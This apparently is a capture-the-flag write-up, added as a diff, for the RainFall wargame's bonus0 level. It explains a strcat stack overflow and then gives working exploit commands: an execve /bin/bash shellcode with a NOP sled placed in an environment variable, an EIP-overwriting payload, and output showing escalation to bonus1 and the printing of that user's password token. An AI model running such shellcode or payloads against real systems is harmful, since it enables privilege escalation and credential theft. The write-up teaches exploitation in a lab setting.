@@ -1,0 +1,49 @@
+# Analysis
+
+By testing the program, we can notice that it reads on the standard input twice.
+Now, by reversing it, we see a call to a function pp() which itself calls the function p() twice
+(we can already guess that the read is done by p() function).
+Indeed, inside p() function, a read of 4096 bytes is performed, and the input is stored into a stack buffer which can handle
+4096 bytes correctly.
+Also, two pointers are passed to p() function by pp() function : a pointer to the stack, which is a basic array of bytes, and a pointer to a static
+string " - " which will be displayed by p() through a puts() call.
+Then, after removing the '\n' from our input,
+p() calls a strncpy to the first argument passed, copying the read input into it, with 20 maximum bytes (there is no overflow here).
+That process is done twice with two different buffers, but these are concatenated at the end of pp() function call, with strcat (which isn't secure).
+That's where the buffer overflow happens, the source buffer is the first buffer passed to p() which is already filled with 20 bytes, it cannot handle
+concatenation of both buffers and this leads to the saved EIP rewriting on stack.
+No NX bit is set, the stack is executable.
+
+# Exploit
+We will overwrite the saved EIP on stack to make it point to our shellcode (we cannot use ret2libc because we can't write enough addresses
+into the stack, because of the strncpy which limits to 20 bytes : the overflow happens only for a few bytes, enough for 1 address).
+The shellcode (calling /bin/bash) will be stored in an environment variable, we'll get its address with getenv() function all.
+A nopsled of 4096 bytes will be used to save time (so that we don't need to get the exact address).
+
+# Crafting
+
+bonus0@RainFall:~$ export SHELLCODE=`python -c 'print "\x90"*4096 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"'`
+bonus0@RainFall:~$ cd /tmp/
+bonus0@RainFall:/tmp$ ./bonus0 # That's a program that just calls (getenv("SHELLCODE")). 
+0xbfffe905
+bonus0@RainFall:/tmp$ cd
+bonus0@RainFall:~$ python
+Python 2.7.3 (default, Jun 22 2015, 19:43:34) 
+[GCC 4.6.3] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> hex(0xbfffe905 + 512)
+'0xbfffeb05L'
+>>> 
+bonus0@RainFall:~$ python -c 'print "A"*4095 + "\n" + "B"*14 + "\x05\xeb\xff\xbf" + "A\n"' > /tmp/a
+
+# Shooting
+
+bonus0@RainFall:~$ cat /tmp/a - | ./bonus0 
+ - 
+ - 
+AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBB���A BBBBBBBBBBBBBB���A
+id
+uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
